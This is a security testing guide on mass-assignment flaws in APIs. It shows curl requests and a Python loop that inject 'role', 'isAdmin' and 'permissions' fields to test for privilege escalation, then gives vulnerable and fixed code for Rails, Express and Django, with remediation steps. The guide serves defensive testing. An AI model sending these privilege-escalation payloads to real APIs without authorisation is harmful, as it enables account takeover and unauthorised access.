# API Reference: Mass Assignment Vulnerability Testing

## OWASP API3:2023 — Broken Object Property Level Authorization

### Description
API accepts and processes fields that should not be client-settable.
Attackers add extra fields (role, isAdmin) to modify server-side properties.

## Common Vulnerable Fields

| Field | Impact |
|-------|--------|
| `role` / `isAdmin` | Privilege escalation |
| `permissions` | Authorization bypass |
| `verified` / `email_verified` | Account verification bypass |
| `balance` / `credits` | Financial manipulation |
| `plan` / `subscription` | Service tier elevation |

## Testing Methodology

### Step 1: Observe Normal Request
```bash
curl -X PUT https://api.target.com/users/me \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"name": "Test User"}'
```

### Step 2: Add Privilege Fields
```bash
curl -X PUT https://api.target.com/users/me \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"name": "Test User", "role": "admin", "isAdmin": true}'
```

### Step 3: Verify Changes
```bash
curl https://api.target.com/users/me -H "Authorization: Bearer $TOKEN"
```

## Python Testing Script

```python
import requests

base_payload = {"name": "Test"}
privilege_fields = {
    "role": "admin",
    "isAdmin": True,
    "permissions": ["*"],
}

for field, value in privilege_fields.items():
    payload = {**base_payload, field: value}
    resp = requests.put(url, json=payload, headers=headers)
    if resp.status_code == 200 and field in resp.text:
        print(f"VULNERABLE: {field} accepted")
```

## Framework-Specific Vulnerabilities

### Ruby on Rails
```ruby
# Vulnerable
User.new(params[:user])

# Fixed
User.new(params.require(:user).permit(:name, :email))
```

### Node.js/Express
```javascript
// Vulnerable
User.findByIdAndUpdate(id, req.body)

// Fixed
const { name, email } = req.body;
User.findByIdAndUpdate(id, { name, email })
```

### Django REST Framework
```python
# Vulnerable: all fields writable
class UserSerializer(serializers.ModelSerializer):
    class Meta:
        model = User
        fields = '__all__'

# Fixed: explicit fields
class UserSerializer(serializers.ModelSerializer):
    class Meta:
        model = User
        fields = ['name', 'email']
        read_only_fields = ['role', 'is_admin']
```

## Remediation
1. Use allowlists for acceptable fields (never blocklists)
2. Implement read-only fields for sensitive properties
3. Use separate DTOs for input and output
4. Validate request schema against OpenAPI spec
